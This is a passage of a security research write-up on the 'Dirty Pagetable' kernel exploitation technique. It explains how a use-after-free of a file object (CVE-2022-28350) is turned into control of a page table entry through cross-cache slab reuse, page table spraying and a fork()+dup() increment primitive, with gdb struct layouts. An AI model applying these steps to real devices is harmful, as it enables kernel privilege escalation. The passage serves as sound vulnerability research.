> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [yanglingxi1993.github.io](https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html)

> by Nicolas Wu(@NVamous)

**_by Nicolas Wu([@NVamous](https://twitter.com/NVamous))_**

1. Introduction to Dirty Pagetable[](#1-introduction-to-dirty-pagetable "Permanent link")
------------------------------------------------------------------------------------------


We can see that the victim fd is associated with a released file object at the slab of the filp kmem cache. It’s easy to get this scene with CVE-2022-28350; more details can be found here[7]. The released file object is the victim file object used later. And the slab in which the victim file object lies is the victim slab.

#### 4.2.2 Reclaim the victim slab into the page allocator[](#422-reclaim-the-victim-slab-into-the-page-allocator "Permanent link")

This step is a regular part of the cross-cache attack. After we trigger the vulnerability and free all the other objects on the victim slab, the victim slab may be reclaimed into the page allocator. And many researchers have proposed ways to ensure this. So no more discussion here.

#### 4.2.3 Occupy the victim slab with user page tables[](#423-occupy-the-victim-slab-with-user-page-tables "Permanent link")

We know that the size of the slab of filp kmem cache is two pages on Android, and the size of the user page table is one page. Although the size of the victim slab and user page table is unequal, we still get a big chance to occupy the victim slab with the user page tables by heap spray. In practice, the success rate of occupation is almost 100%. After the occupation, the layout of the victim file object and user page table is supposed to be like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets3/pic2_occupy_slab_with_pagetable.svg)

Figure 15

As you can see, the victim file object locates in the user page table.

#### 4.2.4 Construct the increment primitive and locate the virtual user address corresponding to the victim PTE[](#424-construct-the-increment-primitive-and-locate-the-virtual-user-address-corresponding-to-the-victim-pte "Permanent link")

Although we make the victim file object located in the user page table, we can perform very limited operations on the victim file object because it’s an illegal file object. Most operations on the victim file object would trigger illegal memory access, and kernel panic would happen. After a long time of searching, I found that the `f_count` field of the file object can be incremented by one many times with dup() without triggering a kernel panic. Because the dup() consumes fd resources and a single process can only generate 32768 fd at most, we can only add 32768 to `f_count` at most in a process. This is just not enough(You will know the reason later). So I kept on looking, and it turns out that fork()+dup() would help us break the limitation. We can call fork() first, which will add 1 to the `f_count` of the victim file object, and then in the child process, we can add 32768 to `f_count`. Because we can repeat fork()+dup() many times, so we succeed in breaking the limitation. Although there is still a limitation for the increment times, it won’t bother us that much.

We now have an increment primitive for the `f_count` of the victim file object. Our next step is obvious: let the position of the victim PTE coincide with the `f_count`, then we can perform the increment primitive to the victim PTE and control it to some extent.

The aligned size of a file object is 320 bytes, the offset of `f_count` is 56, and the size of `f_count` is 8 bytes:

```
(gdb) ptype /o struct file
/* offset      |    size */  type = struct file {
/*      0      |      16 */    union {
/*                     8 */        struct llist_node {
/*      0      |       8 */            struct llist_node *next;

                                       /* total size (bytes):    8 */
                                   } fu_llist;
/*                    16 */        struct callback_head {
/*      0      |       8 */            struct callback_head *next;
/*      8      |       8 */            void (*func)(struct callback_head *);

                                       /* total size (bytes):   16 */
                                   } fu_rcuhead;

                                   /* total size (bytes):   16 */
                               } f_u;
/*     16      |      16 */    struct path {
/*     16      |       8 */        struct vfsmount *mnt;
/*     24      |       8 */        struct dentry *dentry;

                                   /* total size (bytes):   16 */
                               } f_path;
/*     32      |       8 */    struct inode *f_inode;
/*     40      |       8 */    const struct file_operations *f_op;
/*     48      |       4 */    spinlock_t f_lock;
/*     52      |       4 */    enum rw_hint f_write_hint;
/*     56      |       8 */    atomic_long_t f_count;
/*     64      |       4 */    unsigned int f_flags;
......
......
/*    288      |       8 */    u64 android_oem_data1;

                               /* total size (bytes):  296 */
                             }
```

The size of the slab of filp kmem cache is two pages, and there are 25 file objects in a slab of filp kmem cache; the layout of a slab is like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets3/pic3_slab_layout_of_filp.svg)

Figure 16

Because there are 25 possible positions for the victim file object, to ensure that the `f_count` of the victim file object and the victim PTE are coincident in position, we have to prepare every user page table like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets3/pic4_pagetable_layout.svg)

Figure 17

